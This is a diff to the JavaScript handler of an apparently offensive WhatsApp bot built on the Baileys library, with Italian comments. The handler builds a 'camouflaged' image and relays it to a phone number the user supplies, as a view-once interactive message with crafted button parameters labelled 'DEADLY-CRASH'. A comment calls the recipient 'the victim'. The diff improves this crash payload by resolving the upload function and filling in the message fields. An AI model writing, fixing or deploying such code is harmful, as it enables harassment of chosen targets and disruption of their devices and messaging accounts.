@@ -7,7 +7,7 @@ let handler = async (m, { conn, text, command }) => {
   let target = `${text.replace(/[^0-9]/g, '')}@s.whatsapp.net`
 
   try {
-    // genera immagine camuffata
+    // Genera immagine camuffata
     const width = 800
     const height = 600
     const canvas = createCanvas(width, height)
@@ -23,11 +23,20 @@ let handler = async (m, { conn, text, command }) => {
 
     const buffer = canvas.toBuffer()
 
+    // Estrae la funzione di upload corretta dal tuo client Baileys
+    const uploadFn = conn.waUploadToServer || conn.logger?.upload || conn.ws?.waUploadToServer
+
+    if (!uploadFn) {
+      throw new Error("Funzione 'waUploadToServer' non trovata nell'istanza del bot.")
+    }
+
+    // Genera il contenuto multimediale con la funzione di upload estratta
     let prepared = await generateWAMessageContent(
       { image: buffer },
-      { upload: conn.waUploadToServer }
+      { upload: uploadFn }
     )
 
+    // Crea il payload del messaggio interattivo (Native Flow)
     let msg = await generateWAMessageFromContent(target, {
       viewOnceMessage: {
         message: {
@@ -40,17 +49,24 @@ let handler = async (m, { conn, text, command }) => {
               text: "𝐃𝐄𝐀𝐃𝐋𝐘-𝐂𝐑𝐀𝐒𝐇"
             },
             nativeFlowMessage: {
-              messageParamsJson: "",
+              messageParamsJson: JSON.stringify({}),
               buttons: [
-                { name: "single_select", buttonParamsJson: "z" },
-                { name: "call_permission_request", buttonParamsJson: "{}" }
+                { 
+                  name: "single_select", 
+                  buttonParamsJson: JSON.stringify({ title: "Select", sections: [] }) 
+                },
+                { 
+                  name: "call_permission_request", 
+                  buttonParamsJson: JSON.stringify({}) 
+                }
               ]
             }
           }
         }
       }
-    }, {})
+    }, { userJid: conn.user?.id || conn.user?.jid })
 
+    // Invia il pacchetto relay alla vittima
     await conn.relayMessage(target, msg.message, { messageId: msg.key.id })
 
     m.reply(`✅ Foto camuffata inviata a ${text}`)
